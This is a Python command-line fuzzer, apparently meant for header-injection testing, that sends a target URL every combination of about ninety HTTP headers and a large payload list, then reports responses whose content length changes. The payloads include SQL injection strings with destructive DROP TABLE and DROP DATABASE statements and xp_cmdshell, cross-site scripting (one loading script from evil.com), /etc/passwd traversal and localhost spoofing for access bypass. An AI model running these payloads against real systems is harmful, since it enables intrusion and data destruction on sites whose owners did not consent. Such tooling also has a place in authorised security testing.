import requests
import argparse
import sys
from urllib.parse import urlparse
from colorama import init, Fore

init(autoreset=True)

header_art = """
 _   _                      _                     
| | | |   ___    __ _    __| |   ___   _ __   ___ 
| |_| |  / _ \\  / _` |  / _` |  / _ \\ | '__| / __|
|  _  | |  __/ | (_| | | (_| | |  __/ | |    \\__ \\
|_| |_|  \\___|  \\__,_|  \\__,_|  \\___| |_|    |___/
"""

global_headers = [
    "Client-IP", "Connection", "Contact", "Forwarded", "From", "Host", "Origin", "Referer",
    "True-Client-IP", "X-Client-IP", "X-Custom-IP-Authorization", "X-Forward-For",
    "X-Forwarded-For", "X-Forwarded-Host", "X-Forwarded-Server", "X-Host", "X-HTTP-Host-Override",
    "X-Original-URL", "X-Originating-IP", "X-Real-IP", "X-Remote-Addr", "X-Remote-IP",
    "X-Rewrite-URL", "X-Wap-Profile", "Accept", "Accept-Encoding", "Accept-Language",
    "Authorization", "Cache-Control", "Cookie", "Content-Length", "Content-Type",
    "DNT", "Expect", "Forwarded-For", "Forwarded-Proto", "Forwarded-Port", "If-Match",
    "If-Modified-Since", "If-None-Match", "If-Range", "If-Unmodified-Since", "Max-Forwards",
    "Proxy-Authorization", "Range", "TE", "Upgrade", "User-Agent", "Via", "Warning", "X-ATT-DeviceId",
    "X-Correlation-ID", "X-CSRF-Token", "X-Do-Not-Track", "X-Forwarded-Port", "X-Forwarded-Proto",
    "X-Frame-Options", "X-Http-Method-Override", "X-Pingback", "X-Requested-With", "X-UIDH",
    "X-XSS-Protection", "Upgrade-Insecure-Requests", "Sec-Fetch-Dest", "Sec-Fetch-Mode",
    "Sec-Fetch-Site", "Sec-Fetch-User", "Strict-Transport-Security", "Timing-Allow-Origin",
    "Access-Control-Allow-Origin", "Access-Control-Allow-Credentials", "Access-Control-Allow-Methods",
    "Access-Control-Allow-Headers", "Access-Control-Max-Age", "Access-Control-Request-Headers",
    "Access-Control-Request-Method", "Pragma", "Keep-Alive", "Proxy-Connection", "X-Content-Type-Options",
    "X-Powered-By", "X-UA-Compatible", "X-WebKit-CSP", "X-Content-Security-Policy", "X-WebKit-CSP-Report-Only",
    "X-Content-Security-Policy-Report-Only", "Content-Security-Policy", "Content-Security-Policy-Report-Only"
]

inject = [
    "127.0.0.1", "localhost", "0.0.0.0", "0", "127.1", "127.0.1", "2130706433", "127.0.0.1:8080",
    "localhost:8080", "><script>alert(1)</script>", "/../../../../etc/passwd", "csharp", "Ctrl",
    "<script>alert('XSS')</script>", "1; DROP TABLE users", "' OR '1'='1", "admin' --", "admin' #",
    "admin'/*", "OR 1=1", "' OR 1=1--", '" OR 1=1--', 'OR 1=1', 'UNION SELECT NULL, NULL, NULL', "' OR 'a'='a",
    'SELECT * FROM users WHERE name = "a"', '1; EXEC xp_cmdshell("dir")', '1" --', '1\' OR \'1\'=\'1', 
    '--', ';--', '/*', '*/', '@@version', '@@hostname', '@@datadir', '@@basedir', 'sleep(10)', 
    'WAITFOR DELAY \'00:00:10\'', '<img src=x onerror=alert(1)>', '<svg/onload=alert(1)>', '1; SELECT * FROM information_schema.tables', 
    '"; --', '--;', 'DROP TABLE users', '1=1', '1\'1\'', '0x50', '0x60', '0x70', '0x80', '0x90',
    '><body onload=alert(1)>', '"><script src=http://evil.com/xss.js></script>', "<iframe src='javascript:alert(1)'>",
    'javascript:alert(1)', '"><svg/onload=alert(1)>', '" /><svg/onload=alert(1)>', '"><img src=1 onerror=alert(1)>',
    '"><img src=x onerror=alert(document.domain)>', '"><script>alert(document.cookie)</script>',
    '"><iframe src="javascript:alert(document.cookie)"></iframe>', '"><img src="x" onerror="alert(document.cookie)">',
    '1 AND 1=1', '1\' AND 1=1', '1" AND 1=1', '1" AND sleep(5)', '1\' AND sleep(5)', '1\' UNION SELECT null, version() --',
    '" UNION SELECT null, version() --', '1 UNION SELECT null, table_name FROM information_schema.tables --',
    '1\' AND 1=1 --', '1" AND 1=1 --', '" OR ""="', "' OR ''='", '1" OR "1"="1', '1\' OR \'1\'=\'1',
    '" OR "a"="a', "' OR 'a'='a", '" OR 1=1 --', "' OR 1=1 --", '" OR x=x --', "' OR x=x --", '1 OR 1=1',
    '1;--', '1; DROP TABLE users --', '1; DROP DATABASE test --', '1\' DROP TABLE users --', '" DROP TABLE users --',
    '1 AND (SELECT COUNT(*) FROM users) > 0', '1 OR (SELECT COUNT(*) FROM users) > 0', '" OR 1=1 --', "' OR 1=1 --"
]

def resolve_content_length(url, headers, method):
    try:
        if method == 'GET':
            response = requests.get(url, headers=headers)
        elif method == 'POST':
            response = requests.post(url, headers=headers)
        else:
            raise ValueError("Unsupported method")
        
        response.raise_for_status()  # Raise HTTPError for bad responses
        content_length = response.headers.get('content-length')
        if content_length:
            return int(content_length)
        return len(response.content)
    except requests.RequestException as e:
        print(Fore.RED + f"Request to {url} with headers {headers} failed: {e}")
        return None

def header_inject(url, methods, verbose):
    for method in methods:
        baseline_content_length = resolve_content_length(url, {}, method)
        if baseline_content_length is None:
            print(Fore.RED + f"[-] {url} {method} request failed.")
            continue

        print(f"Baseline Content-Length for {method}: {baseline_content_length}")

        for header in global_headers:
            for value in inject:
                headers = {header: value}
                content_length = resolve_content_length(url, headers, method)
                if content_length is None:
                    continue

                if content_length != baseline_content_length:
                    print(Fore.GREEN + f"[+] {url} [{method}] [{header}: {value}] Content-Length: {content_length}")
                else:
                    if verbose:
                        print(Fore.RED + f"[-] {url} [{method}] [{header}: {value}] Content-Length: {content_length}")

def main():
    print(header_art)
    parser = argparse.ArgumentParser(description='Perform header injection testing.')
    parser.add_argument('-u', '--url', dest='url', required=True, help='URL to test for header injection')
    parser.add_argument('-m', '--methods', dest='methods', nargs='+', default=['GET'], help='HTTP methods to use for testing (e.g., GET POST)')
    parser.add_argument('-v', '--verbose', dest='verbose', action='store_true', help='Enable verbose output')
    args = parser.parse_args()

    url = args.url
    parsed_url = urlparse(url)

    if not all([parsed_url.scheme, parsed_url.netloc]):
        print("Invalid URL:", url)
        sys.exit(1)

    try:
        header_inject(url, args.methods, args.verbose)
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n[!] Script interrupted by user. Exiting...")

if __name__ == "__main__":
    main()
